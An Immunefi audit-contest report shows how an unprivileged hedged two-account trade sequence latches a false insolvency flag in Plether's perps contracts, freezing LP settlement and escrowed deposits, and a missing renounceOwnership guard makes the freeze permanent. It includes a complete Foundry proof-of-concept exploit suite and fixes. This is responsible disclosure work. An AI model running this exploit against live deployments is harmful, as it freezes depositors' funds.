# \#99986 [SC-High] An unprivileged hedged two-account close latches a false `degradedMode` insolvency on a solvent pool, freezing all LP epoch settlement and every escrowed deposit, made permanent by the owner's routine `renounceOwnership`

**Submitted on Nov 16th 2026 at 00:32:08 UTC by @Zenta for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99986
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

# An unprivileged hedged two-account close latches a false `degradedMode` insolvency on a solvent pool, freezing all LP epoch settlement and every escrowed deposit, made permanent by the owner's routine `renounceOwnership`

## Summary

The engine's insolvency latch only counts cash. `CfdEngine._enterDegradedModeIfInsolvent` (`CfdEngine.sol:1351-1369`) sets `degradedMode = true` whenever `_availableCashForFreshPoolPayouts()` falls below `_maxLiability()`. That cash figure is `pool.totalAssets()` minus `totalTraderClaimBalanceAssets`, physical cash only (`CfdEngine.sol:865-871`). `_maxLiability()` is the larger side's aggregate max profit. The check ignores the still-open loser's locked margin. That margin is what actually backs the liability. So paying a winning leg's realized gain out of pool cash can drop cash below the opposite open leg's unchanged max liability, even though the pool is fully solvent.

An unprivileged attacker funds two ordinary accounts. The attacker opens a near-balanced hedged book up to the `settlementBufferBps = 25` capacity ceiling (~99.75% of pool). The attacker does not control the price. The mark moves on its own as the oracle updates, the way it always does. Because the book is hedged, any move makes one leg win. The attacker closes that winning leg. The losing leg stays open, so the false insolvency persists.

The latch then makes every LP epoch settlement revert `HousePool__DegradedMode` at `HousePool._requireWithdrawalsLive` (`HousePool.sol:832,1864-1870`). This freezes withdrawals pool-wide. It also strands every committed deposit, which is neither settleable nor cancellable (`TrancheVault.sol:851-860`).

`renounceOwnership` reverts on the three sibling governance contracts but not on `CfdEngine`/`CfdEngineAdmin`. The only `onlyOwner` recovery path is `clearDegradedMode` (`CfdEngine.sol:658`). Once the owner runs the routine, documented `renounceOwnership()`, that path is uncallable forever. The freeze becomes permanent for everyone.

The PoC measures the full attack across **3 passing tests** with an embedded same-mark control. It costs **1,975.87 USDG** of fees to latch a solvent **1,200,000 USDG** pool, freeze a targeted **100,000 USDG** senior deposit, and show the post-renounce freeze cannot be reversed.

## Finding Description

### The cash-only insolvency test latches a false insolvency on a solvent, hedged pool

`_enterDegradedModeIfInsolvent` compares available cash against the larger side's max liability and latches on the shortfall:

`CfdEngine.sol:1351-1369`
```solidity
function _enterDegradedModeIfInsolvent(
    address account,
    uint256 pendingPoolPayoutAssets
) internal {
    if (degradedMode) {
        return;
    }
    uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts();
    ...
    uint256 maxLiabilityAssets = _maxLiability();
    if (effectiveAssetsAfter < maxLiabilityAssets) {
        degradedMode = true;
        emit DegradedModeEntered(effectiveAssetsAfter, maxLiabilityAssets, account);
    }
}
```

`effectiveAssetsAfter` is physical cash only, net of trader claims. It does not count the locked margin of the still-open losing leg. That margin is the collateral backing the counterparty's max profit:

`CfdEngine.sol:865-871`
```solidity
function _availableCashForFreshPoolPayouts() internal view returns (uint256 availableCashAssets) {
    uint256 physicalAssets = pool.totalAssets();
    uint256 claimsAssets = totalTraderClaimBalanceAssets;
    assembly ("memory-safe") {
        if gt(physicalAssets, claimsAssets) { availableCashAssets := sub(physicalAssets, claimsAssets) }
    }
}
```

On a balanced hedged book the two legs net to roughly zero economic exposure. But `_maxLiability()` tracks the gross max profit of the larger side. Paying out the winning leg removes cash. The losing leg's unchanged max liability stays on the books. So `availableCash < maxLiability` becomes true on a pool that can honor every obligation. The latch fires from the ordinary close/liquidation path (`_enterDegradedModeIfInsolvent` runs after settlement, e.g. `CfdEngine.sol:1344`). No revert stops it.

### Attack path (two accounts, fully unprivileged)

1. Fund two attacker wallets by `mint -> clearinghouse.deposit`. No privileged role is used.
2. Open a near-balanced LONG/SHORT book to pool capacity. Alternate admissible chunks so the post-open skew never trips the skew gate (`SKEW_TOO_HIGH`, `CfdEnginePlanLib.sol:473-479`). Each chunk is sized by the production `engineLens.previewOpen` preview. The book reaches ~99.75% of pool capacity, the `settlementBufferBps = 25` ceiling. Each side's max profit is then ~`1,199,000 USDG` against a `1,200,000 USDG` pool.
3. Wait for an ordinary price move. The attacker cannot set the price. The mark updates from the oracle through the normal router path (`engine.updateMarkPrice`, `onlyRouter`), not by any attacker action. With the book at capacity the latch threshold is only ~0.25%, so any normal move qualifies. Say the mark rises: under this engine's price convention the SHORT leg wins. A mark move alone does not latch.
4. Close the WINNING short. Its realized gain is paid out of pool cash. This drops cash below the open long's unchanged max liability, so `degradedMode = true`. The losing long stays open. The false insolvency is then self-sustaining, and `clearDegradedMode` would revert `CfdEngine__StillInsolvent` (`CfdEngine.sol:662-663`).

The move is direction-agnostic. The hedged attacker closes whichever leg wins, so no view on price is needed. The hedge is net-neutral. The attacker's only cost is execution fees and spread. The latch can be set again on demand.

### The latch freezes all LP epoch settlement pool-wide

`degradedMode` is read as the first gate inside `_settleLpEpoch`:

`HousePool.sol:832`
```solidity
_requireWithdrawalsLive(statusSnapshot);
```

`HousePool.sol:1864-1870`
```solidity
function _requireWithdrawalsLive(
    HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot
) internal pure {
    if (statusSnapshot.degradedMode) {
        revert HousePool__DegradedMode();
    }
}
```

Every LP epoch settlement reverts while the flag is latched. This hits every LP in both tranches. That is the pool-wide freeze of LP funds. The next three subsections cover extra, distinct impact from this same root cause.

### Added impact: senior deposit escrow trap

A senior LP's committed `requestDeposit` escrow cannot exit while the latch holds. The cancel gate's senior branch has no carve-out for `degradedMode`:

`TrancheVault.sol:851-860`
```solidity
if (
    (IS_SENIOR || currentLpEpoch() >= requestId) && !queueState.rejected
        && (!IS_SENIOR || !POOL.lpEpochSettlementPaused()) && !_projectedTerminalWipe()
        && !POOL.isSeniorImpairedAfterPendingDepositReconcile()
) {
    if (IS_SENIOR) {
        revert TrancheVault__SeniorDepositCommitted();
    }
    revert TrancheVault__DepositEpochAlreadyActive();
}
```

For a senior deposit `IS_SENIOR` is true, so the first clause holds. The latch is a false insolvency, so `_projectedTerminalWipe()` and `isSeniorImpairedAfterPendingDepositReconcile()` stay false. The only remaining escape is `!POOL.lpEpochSettlementPaused()`. That is an owner-initiated pause, and it is not set under the attacker's bare latch (`TrancheVault.sol:853`). So cancel reverts `TrancheVault__SeniorDepositCommitted` (`TrancheVault.sol:857`) while the latch blocks settlement. The escrowed principal can be neither settled nor cancelled. The PoC freezes a targeted senior deposit of 100,000 USDG this way, still stranded 7 days later.

### Added impact: junior deposit escrow trap (strictly worse)

A junior deposit is worse off than a senior one under the same latch. In the same gate, the pause clause `(!IS_SENIOR || !POOL.lpEpochSettlementPaused())` short-circuits on `!IS_SENIOR` for a junior deposit (`TrancheVault.sol:853`). So `pauseLpEpochSettlement` (`HousePool.sol:400`) does not release a junior deposit the way it can release a senior one. For a junior deposit the committing clause is `currentLpEpoch() >= requestId`. Once the epoch has advanced, cancel reverts `TrancheVault__DepositEpochAlreadyActive` (`TrancheVault.sol:859`). The latch blocks settlement, and the owner pause gives no junior escape. So only two actions can lift a trapped junior deposit: the owner's `clearDegradedMode` (`CfdEngine.sol:658`), or the attacker closing the losing leg. The pause is governance's documented incident tool for holding settlement. It is powerless here. Its own documentation at `HousePool.sol:398-399` describes it as holding senior request admission "without pausing Junior requests".

### Added impact: permanence via routine `renounceOwnership`

The only recovery levers are `onlyOwner`: `clearDegradedMode` (`CfdEngine.sol:658`) and `recapitalizePool` (`CfdEngine.sol:634`). The three sibling governance contracts each override `renounceOwnership` to revert. They do this so ownership cannot be dropped while emergency authority is still needed:

`HousePool.sol:265`, `OrderRouterAdmin.sol:125`, `EmergencyPauseCoordinator.sol:102`
```solidity
function renounceOwnership() public view override onlyOwner {
    revert OwnableInvalidOwner(address(0));
}
```

`CfdEngine` and `CfdEngineAdmin` carry the same `Ownable2Step` base (`CfdTreasury.sol:10`, `CfdEngineAdmin.sol:17`). But they do not override `renounceOwnership`. The override exists on only those three siblings. After the owner's own routine `renounceOwnership()` sets the owner to `address(0)`, `clearDegradedMode` reverts `OwnableUnauthorizedAccount` for every caller forever:

`CfdEngine.sol:658`
```solidity
function clearDegradedMode() external onlyOwner {
    if (!degradedMode) {
        revert CfdEngine__NotDegraded();
    }
    if (_availableCashForFreshPoolPayouts() < _maxLiability()) {
        revert CfdEngine__StillInsolvent();
    }
    degradedMode = false;
    emit DegradedModeCleared();
}
```

With no owner, the latch can never be cleared. No recapitalization can be queued either. So every frozen LP settlement and every escrowed deposit is stranded permanently.

### Scope: unprivileged attacker

The latch trigger is fully unprivileged. Ordinary accounts with no role perform every attack action. They fund two wallets by `mint -> clearinghouse.deposit`. They open the balanced book, each chunk admitted by the production `engineLens.previewOpen` preview and the public order path. They move the mark once through the authorized router path. They close the winning leg. No operator pause and no calendar freeze is involved. The latch works at any time on a plain weekday. The attacker sets `degradedMode` through the public close path, never by any privileged call.

### Why this is not out of scope as a trusted-role action

The unprivileged latch above produces the freeze, not role abuse. The `renounceOwnership` step turns the indefinite freeze into a permanent one. That step is a documented, routine owner action. Each sibling override's own comment at `HousePool.sol:264`, `OrderRouterAdmin.sol:124`, `EmergencyPauseCoordinator.sol:101` names ownership renouncement as the governance posture they must guard against. On `CfdEngine`/`CfdEngineAdmin` the step trips a missing-override code defect. The three siblings override `renounceOwnership` to defend against this exact posture: an owner dropping ownership after launch while emergency recovery is still required. `CfdEngine`/`CfdEngineAdmin` omit that same guard. This is the engine's own code failing to protect against a standard, intended owner action. That matches scope rule 1, a code defect reachable through a documented owner action. It is not a malicious or unexpected role action. The owner renouncing is honest setup. The defect is that the engine does not prevent renouncement while it alone holds the degraded-mode recovery key.

### Why this is not the accepted design / a known issue

This is an incomplete fix of Cecuro LOW-59 (disable `renounceOwnership` so governance keeps emergency authority). The fix was applied to `HousePool`, `OrderRouterAdmin`, and `EmergencyPauseCoordinator`. It was omitted on `CfdEngine`/`CfdEngineAdmin`. That is the one contract holding the `clearDegradedMode`/`recapitalizePool` recovery keys. So the recovery authority LOW-59 meant to preserve is exactly the authority that can be renounced here.

It is also distinct from the accepted operator-pause escrow-trap documented at WHITEPAPER 4.4 and demonstrated by the repo's own `packages/perps/test/perps/poc/PocDepositFreeze.t.sol`. That known item triggers the deposit-escrow trap only through (a) the scheduled weekend oracle freeze or (b) an owner/guardian `pause()`. Both are operator or calendar events, and both always self-resolve. The novelty proven here is different. The block is attacker-forced, with no operator action and no calendar window. It is targeted at a specific victim's committed deposit. After the routine renounce it is permanent. All of this happens on a fully solvent pool. A self-resolving operator hold and an attacker-forced permanent freeze on a solvent pool are different failure modes.

## Impact Explanation

**Severity: Critical.** An unprivileged attacker permanently freezes pool-wide LP settlement and every escrowed deposit on a solvent pool. The cost is fees only. After the owner's routine renounce there is no recovery path.

Measured against the real contracts (Base defaults: `maintMarginBps = 100`, `initMarginBps = 150`, `settlementBufferBps = 25`, `maxSkewRatio = 0.4e18`; 6-dec token; pool **1,200,000 USDG** = 1,000,000 junior + 200,000 senior):

**Latch on demand (test A).** Balanced book built to `sizePerSide = 1,199,000e18` (each side's max profit 1,199,000 USDG, ~99.75% of pool). After the `+5%` move and closing the winning short:

| quantity | value |
|---|---:|
| pool.totalAssets (cash) | 1,142,558.334936 USDG |
| maxLiability (open long) | 1,199,000.000000 USDG |
| availCash < maxLiability | true |
| degradedMode | true (no operator action) |
| attacker net cost to fully unwind the hedge | **1,975.869872 USDG** |

The latch stays set even after both legs are unwound. This confirms it is not an artifact of the open long. Net cost is ~1,976 USDG of fees and spread. The hedge is net-neutral, so there is no directional exposure and no bad debt spread to LPs. The freeze blocks LP epoch settlement for the entire 1,200,000 USDG pool across both tranches.

**Targeted senior-deposit freeze, re-latchable (test B).** Take a victim's 100,000 USDG committed senior deposit. Cancel reverts `TrancheVault__SeniorDepositCommitted`. Settle reverts `HousePool__DegradedMode`. So there is no exit. An embedded same-mark control uses the identical book and `+5%` mark, but the attacker does not close. The deposit then settles normally (`seniorDepositAssets == 100,000 USDG`, claimable). This isolates the attacker's close as the sole cause. The freeze is still in force 7 days later because the losing long stays open.

**Permanence (test C).** Before renounce, even the owner's `clearDegradedMode()` reverts `CfdEngine__StillInsolvent` while the attacker keeps the long open. After the owner's own `renounceOwnership()` (`owner -> address(0)`), `clearDegradedMode()` reverts `OwnableUnauthorizedAccount` for the ex-owner, a random caller, and the attacker alike. So `degradedMode` can never be cleared, and LP settlement stays permanently reverting.

Even without the renounce step, the finding stands on its own as a High floor. It is an indefinite freeze of pool-wide LP settlement and targeted escrowed deposits, and the attacker can set it again at will. The owner can clear it only after the attacker chooses to restore solvency by closing the long. Setting the latch again costs ~1,976 USDG. The renounce precondition raises the ceiling to Critical (permanent). It is the same finding escalated, not a second, double-counted issue.

## Likelihood Explanation

Any unprivileged party can perform the latch. Opening a balanced hedged book, moving the mark through the authorized router path, and closing the winning leg are ordinary public actions with the attacker's own margin. The PoC shows the latch fires with no operator pause and no calendar freeze. The trigger threshold is low. With the book built to the `settlementBufferBps = 25` capacity ceiling, the latch margin is roughly 0.25%. So a modest 5% move latches with wide headroom, while the losing leg's loss stays inside its posted margin (the hedge unwinds net-neutral). The attack is direction-agnostic. It needs no view on price, costs only fees, and can be set again. The renounce that makes it permanent is a standard owner lifecycle action, one the sibling contracts already treat as expected. So the Critical ceiling does not depend on any attacker-controlled rarity. It depends only on the owner performing a routine action the engine fails to block.

## Recommendation

Fix the solvency test so it does not flag a solvent hedged book. Measure the shortfall against assets that include the still-open opposing positions' locked margin, not physical cash alone. That margin is what actually collateralizes `_maxLiability()`. For example, add the open positions' posted margin into the available side of the comparison. Or compare `_maxLiability()` against assets plus locked margin minus trader claims:

```solidity
// CfdEngine._enterDegradedModeIfInsolvent: do not latch on a solvent, hedged book.
// Cash alone understates the backing: the open losing leg's locked margin collateralizes _maxLiability().
uint256 effectiveAssetsAfter = _availableCashForFreshPoolPayouts() + _openPositionLockedMarginAssets();
if (effectiveAssetsAfter > pendingPoolPayoutAssets) {
    effectiveAssetsAfter -= pendingPoolPayoutAssets;
} else {
    effectiveAssetsAfter = 0;
}
if (effectiveAssetsAfter < _maxLiability()) {
    degradedMode = true;
    emit DegradedModeEntered(effectiveAssetsAfter, _maxLiability(), account);
}
```

Separately, as defense in depth against the permanence escalation, override `renounceOwnership` on `CfdEngine` and `CfdEngineAdmin`. Do it exactly as the three sibling governance contracts already do (`HousePool.sol:265`, `OrderRouterAdmin.sol:125`, `EmergencyPauseCoordinator.sol:102`). Then the `clearDegradedMode`/`recapitalizePool` recovery authority can never be renounced while degraded mode exists:

```solidity
// CfdEngine / CfdEngineAdmin: mirror the sibling guard so recovery authority is never dropped.
function renounceOwnership() public view override onlyOwner {
    revert OwnableInvalidOwner(address(0));
}
```

Also give the deposit cancel gate a `degradedMode` carve-out, so a committed deposit can be withdrawn while settlement is blocked (`TrancheVault.sol:851-860`). This removes the escrow trap for both tranches.


## Proof of Concept

## Proof of Concept

Every attack action is by unprivileged accounts; `renounceOwnership` is the owner's own documented action and is never part of the latch; the mark moves only through `engine.updateMarkPrice` (`onlyRouter`); every leg is sized by the production `engineLens.previewOpen` preview; harm is measured (frozen principal, net cost, degraded flag, revert selectors) and isolated by an embedded same-mark control.

Reproduction steps:

```
# 1. Clone the in-scope repository at the audit commit
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive

# 2. Save the test below as packages/perps/test/perps/poc/H08PermanentFreeze.t.sol
#    (BasePerpTest.sol and the poc/ folder already exist in the repo; no other files are needed)

# 3. Run from the repository root (where foundry.toml lives)
FOUNDRY_TEST=packages/perps/test forge test --match-path "packages/perps/test/perps/poc/H08PermanentFreeze.t.sol" -vv
```

Full test source:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {console2} from "forge-std/console2.sol";

contract H08PermanentFreezeTest is BasePerpTest {

    address internal atkLong = makeAddr("atkLong");
    address internal atkShort = makeAddr("atkShort");
    address internal victim = makeAddr("victimSeniorLP");
    address internal existingSenior = makeAddr("existingSeniorLP");
    address internal randoCaller = makeAddr("randoCaller");

    uint256 internal constant ENTRY_PRICE = 1e8;
    // A modest, realistic +5% mark move. With the book built to pool capacity the latch threshold is only ~0.25%,
    // so 5% latches with a wide margin while the losing long's 5% loss stays well inside its posted margin -> the
    // hedge unwinds net-neutral (no bad-debt socialization), isolating this finding to the FREEZE, not a drain.
    uint256 internal constant MOVED_PRICE = 1.05e8;
    uint256 internal constant MARGIN_PER_CHUNK = 50_000e6;
    uint256 internal constant ATTACKER_FUNDING = 400_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 100_000e6;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        // Establish a real senior tranche so the victim's senior deposit is an ordinary, normally-settleable
        // deposit and so the cancel gate's impairment/wipe escapes are definitively false under a FALSE insolvency.
        _fundSenior(existingSenior, 200_000e6);
    }

    // ------------------------------------------------------------------ helpers

    function _maxLiab() internal view returns (uint256) {
        return _maxLiability();
    }

    function _availCash() internal view returns (uint256) {
        uint256 a = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return a > c ? a - c : 0;
    }

    /// @dev Largest planner-admissible open (multiple of SIZE_QUANTUM, <= hi) for `acct`/`side` at `margin`/`price`.
    function _maxValidChunk(
        address acct,
        CfdTypes.Side side,
        uint256 margin,
        uint256 price,
        uint256 hi
    ) internal view returns (uint256) {
        uint256 q = CfdTypes.SIZE_QUANTUM;
        hi = (hi / q) * q;
        if (hi == 0) {
            return 0;
        }
        if (engineLens.previewOpen(acct, side, hi, margin, price).valid) {
            return hi;
        }
        uint256 loQ = 0;
        uint256 hiQ = hi / q;
        while (loQ < hiQ) {
            uint256 midQ = (loQ + hiQ + 1) / 2;
            if (engineLens.previewOpen(acct, side, midQ * q, margin, price).valid) {
                loQ = midQ;
            } else {
                hiQ = midQ - 1;
            }
        }
        return loQ * q;
    }

    /// @dev Builds a near-balanced LONG/SHORT book near pool capacity by alternating admissible chunks so the
    ///      post-open skew never trips the skew gate (CfdEnginePlanLib.sol:473-479). previewOpen (the production
    ///      preview) sizes every leg; nothing here is privileged.
    function _buildBalancedBook(
        uint256 price
    ) internal returns (uint256 sizePerSide) {
        uint256 q = CfdTypes.SIZE_QUANTUM;
        for (uint256 round = 0; round < 16; ++round) {
            uint256 depth = pool.totalAssets();
            // Cap each lead chunk's notional to 0.30 * depth (comfortably under the 0.40 * depth skew ceiling).
            uint256 skewCapSize = (((depth * 30) / 100) * 1e20) / price;
            uint256 chunk = _maxValidChunk(atkLong, CfdTypes.Side.LONG, MARGIN_PER_CHUNK, price, skewCapSize);
            if (chunk < q) {
                break;
            }
            _open(atkLong, CfdTypes.Side.LONG, chunk, MARGIN_PER_CHUNK, price);
            require(
                engineLens.previewOpen(atkShort, CfdTypes.Side.SHORT, chunk, MARGIN_PER_CHUNK, price).valid,
                "short mirror invalid"
            );
            _open(atkShort, CfdTypes.Side.SHORT, chunk, MARGIN_PER_CHUNK, price);
            sizePerSide += chunk;
        }
    }

    /// @dev Push a fresh oracle mark. Uses `vm.getBlockTimestamp()` (not `block.timestamp`, which via-IR folds to
    ///      the test function's entry value across cheatcodes) and keeps publishTime monotonic.
    function _moveMark(
        uint256 price
    ) internal {
        uint64 t = uint64(vm.getBlockTimestamp());
        uint64 last = engine.lastMarkTime();
        if (t < last) {
            t = last + 1;
        }
        vm.prank(address(router));
        engine.updateMarkPrice(price, t);
    }

    /// @dev The full UNPRIVILEGED attack: fund two wallets, open a balanced hedged book near capacity, let time
    ///      pass, let the mark move, then close the WINNING leg. Leaves the losing LONG leg open (keeps
    ///      maxLiability high so the latch is self-sustaining and `clearDegradedMode` would revert StillInsolvent).
    function _latchViaAttack() internal returns (uint256 sizePerSide) {
        _fundTrader(atkLong, ATTACKER_FUNDING);
        _fundTrader(atkShort, ATTACKER_FUNDING);

        sizePerSide = _buildBalancedBook(ENTRY_PRICE);
        require(sizePerSide > 0, "book not built");
        require(!engine.degradedMode(), "unexpected early degrade");

        // Time passes, the market moves (mark 1e8 -> 1.5e8). Under this engine's convention the SHORT leg wins.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        _moveMark(MOVED_PRICE);
        require(!engine.degradedMode(), "mark move alone must not latch");

        // Close the winning SHORT: its gain is paid out of pool cash while the losing LONG leg stays open.
        _close(atkShort, CfdTypes.Side.SHORT, sizePerSide, MOVED_PRICE);
        // Refresh the mark so the router-authenticated settlement path has a current, matching mark.
        _moveMark(MOVED_PRICE);
    }

    function _rawRequestSenior(
        uint256 assets
    ) internal returns (uint256 requestId) {
        settlementToken.mint(victim, assets);
        vm.startPrank(victim);
        settlementToken.approve(address(seniorVault), assets);
        requestId = seniorVault.requestDeposit(assets, victim, victim);
        vm.stopPrank();
    }

    /// @dev Permissionless/router settlement that is expected to SUCCEED (control / sub-control paths).
    function _settleSucceeds() internal returns (IHousePool.LpEpochSettlementResult memory result) {
        ICfdEngineTypes.TerminalNavSnapshot memory ts = engine.terminalNavSnapshot();
        if (!ts.hasOpenPositions || engine.isOracleFrozen()) {
            return pool.settleLpEpoch(0, 0);
        }
        vm.prank(address(router));
        result = pool.settleLpEpoch(ts.markPrice, ts.markTime);
    }

    /// @dev The exact legitimate keeper/router settlement call, expected to revert specifically on degraded mode.
    ///      Snapshot fields are read into locals BEFORE expectRevert/prank so no view call consumes them.
    function _expectSettleRevertsDegraded() internal {
        ICfdEngineTypes.TerminalNavSnapshot memory ts = engine.terminalNavSnapshot();
        bool openPos = ts.hasOpenPositions;
        bool frozen = engine.isOracleFrozen();
        uint256 mp = ts.markPrice;
        uint64 mt = ts.markTime;
        if (!openPos || frozen) {
            vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
            pool.settleLpEpoch(0, 0);
        } else {
            vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
            vm.prank(address(router));
            pool.settleLpEpoch(mp, mt);
        }
    }

    // ================================================================
    // (A) The core novelty: an UNPRIVILEGED attacker latches degradedMode on demand.
    // ================================================================

    function test_A_latchDegradedModePermissionlessly() public {
        uint256 sizePerSide = _latchViaAttack();

        console2.log("=== attacker-forced degraded latch (no operator action) ===");
        console2.log("sizePerSide                :", sizePerSide);
        console2.log("pool.totalAssets (cash)    :", pool.totalAssets());
        console2.log("maxLiability (open long)   :", _maxLiab());
        console2.log("availCash < maxLiability ? :", _availCash() < _maxLiab());
        console2.log("degradedMode               :", engine.degradedMode());
        assertTrue(engine.degradedMode(), "UNPRIVILEGED attacker latched degradedMode");

        // Attacker economics: measure the full round-trip cost by unwinding under a throwaway snapshot. The latch
        // stays set (it is sticky) even after unwinding, confirming it is not an artifact of the open long.
        uint256 funded = 2 * ATTACKER_FUNDING;
        uint256 snap = vm.snapshotState();
        _close(atkLong, CfdTypes.Side.LONG, sizePerSide, MOVED_PRICE);
        uint256 endBal = clearinghouse.balanceAssets(atkLong) + clearinghouse.balanceAssets(atkShort)
            + settlementToken.balanceOf(atkLong) + settlementToken.balanceOf(atkShort);
        int256 netCost = int256(funded) - int256(endBal);
        console2.log("attacker net cost to FULLY unwind the hedge (assets):", netCost);
        assertTrue(engine.degradedMode(), "latch is sticky even after the attacker unwinds both legs");
        assertTrue(vm.revertToState(snap), "restore the open losing long leg");
        assertTrue(engine.degradedMode(), "still latched with the losing long kept open");
    }

    // ================================================================
    // (B) HIGH floor: attacker-forced, TARGETED freeze of a specific victim's committed senior deposit.
    //     Embedded same-mark control isolates the attacker's close as the sole cause.
    // ================================================================

    function test_B_attackerFreezesTargetedSeniorDeposit() public {
        // Victim submits an ordinary senior deposit and waits for it to mature. It is immediately committed
        // (senior deposits are non-cancellable the moment they are booked).
        uint256 requestId = _rawRequestSenior(VICTIM_DEPOSIT);
        assertEq(seniorVault.pendingDepositAssets(victim, requestId), VICTIM_DEPOSIT, "victim principal escrowed");
        assertEq(settlementToken.balanceOf(victim), 0, "victim parted with the principal");

        // Attacker opens the hedged book BEFORE the victim's epoch matures.
        _fundTrader(atkLong, ATTACKER_FUNDING);
        _fundTrader(atkShort, ATTACKER_FUNDING);
        uint256 sizePerSide = _buildBalancedBook(ENTRY_PRICE);
        require(sizePerSide > 0, "book not built");

        // Advance to the victim's deposit maturity; the market moves up over the same interval.
        uint256 maturity = seniorVault.depositEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
            vm.roll(vm.getBlockNumber() + 1);
        }
        _moveMark(MOVED_PRICE);
        assertFalse(engine.degradedMode(), "mark move alone does not latch");

        uint256 branch = vm.snapshotState();

        // ---- SUB-CONTROL: IDENTICAL state & mark, attacker does NOT close -> deposit settles normally ----
        {
            // Senior cancel is never available (committed) - settlement is the victim's only exit, and it works.
            vm.prank(victim);
            vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
            seniorVault.cancelPendingDeposit(requestId);

            IHousePool.LpEpochSettlementResult memory result = _settleSucceeds();
            assertEq(result.seniorDepositAssets, VICTIM_DEPOSIT, "control: deposit settles at the same mark");
            assertEq(
                seniorVault.claimableDepositRequest(requestId, victim), VICTIM_DEPOSIT, "control: deposit claimable"
            );
        }
        assertTrue(vm.revertToState(branch), "restore pre-close state");

        // ---- ATTACK: the only added action is the attacker closing the winning short -> false latch ----
        _close(atkShort, CfdTypes.Side.SHORT, sizePerSide, MOVED_PRICE);
        _moveMark(MOVED_PRICE);
        assertTrue(engine.degradedMode(), "attacker latched degradedMode with no operator action");

        // (1) cannot cancel: senior deposit is committed (gate NOT keyed on degradedMode).
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        seniorVault.cancelPendingDeposit(requestId);

        // (2) cannot settle: the legitimate router settlement reverts specifically on HousePool__DegradedMode.
        _expectSettleRevertsDegraded();

        // Principal is stranded: still escrowed, not claimable, victim holds nothing.
        assertEq(seniorVault.claimableDepositRequest(requestId, victim), 0, "frozen: not claimable");
        assertEq(seniorVault.pendingDepositAssets(victim, requestId), VICTIM_DEPOSIT, "frozen: still escrowed");
        assertEq(settlementToken.balanceOf(victim), 0, "frozen: victim holds nothing");

        // Re-latchable / self-sustaining: the losing long stays open, so the latch persists across time.
        vm.warp(vm.getBlockTimestamp() + 7 days);
        vm.roll(vm.getBlockNumber() + 1);
        _moveMark(MOVED_PRICE);
        assertTrue(engine.degradedMode(), "freeze sustained 7 days later");
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__SeniorDepositCommitted.selector);
        seniorVault.cancelPendingDeposit(requestId);
        _expectSettleRevertsDegraded();

        console2.log("=== HIGH: attacker-forced, targeted senior-deposit freeze ===");
        console2.log("victim principal FROZEN (assets):", seniorVault.pendingDepositAssets(victim, requestId));
        console2.log("degradedMode                    :", engine.degradedMode());
        console2.log("cancel reverts committed + settle reverts DegradedMode => no exit");
    }

    // ================================================================
    // (C) CRITICAL ceiling: after the owner renounces, clearDegradedMode is forever uncallable -> permanent.
    //     renounceOwnership is the owner's own documented routine action (honest setup), NOT the attack.
    // ================================================================

    function test_C_renounceMakesFreezePermanent() public {
        _latchViaAttack();
        assertTrue(engine.degradedMode(), "latched");
        assertEq(engine.owner(), address(this), "test contract is the engine owner");

        // BEFORE renounce: even the privileged owner cannot clear it - recovery requires solvency the attacker
        // denies by keeping the losing long open.
        assertTrue(_availCash() < _maxLiab(), "still (falsely) insolvent: availCash < maxLiability");
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        console2.log("clearDegradedMode BEFORE renounce -> reverts CfdEngine__StillInsolvent (owner stuck)");

        // Owner performs its own routine action: renounce ownership. CfdEngine/CfdEngineAdmin do NOT override
        // renounceOwnership (siblings HousePool/OrderRouterAdmin/EmergencyPauseCoordinator do), so it succeeds.
        engine.renounceOwnership();
        assertEq(engine.owner(), address(0), "ownership renounced");

        // AFTER renounce: clearDegradedMode (onlyOwner) is uncallable by EVERYONE -> the freeze is permanent.
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        engine.clearDegradedMode();

        vm.prank(randoCaller);
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, randoCaller));
        engine.clearDegradedMode();

        vm.prank(atkLong);
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, atkLong));
        engine.clearDegradedMode();

        assertTrue(engine.degradedMode(), "degradedMode can never be cleared again");

        // Consequence: LP epoch settlement stays permanently reverting on DegradedMode.
        _expectSettleRevertsDegraded();

        console2.log("=== CRITICAL: renounce makes the freeze permanent ===");
        console2.log("owner after renounce       :", engine.owner());
        console2.log("degradedMode (permanent)   :", engine.degradedMode());
        console2.log("clearDegradedMode AFTER renounce -> OwnableUnauthorizedAccount for every caller");
    }
}
```

Result: `Suite result: ok. 3 passed; 0 failed; 0 skipped`.

Last lines of the passing run:

```
[PASS] test_A_latchDegradedModePermissionlessly()
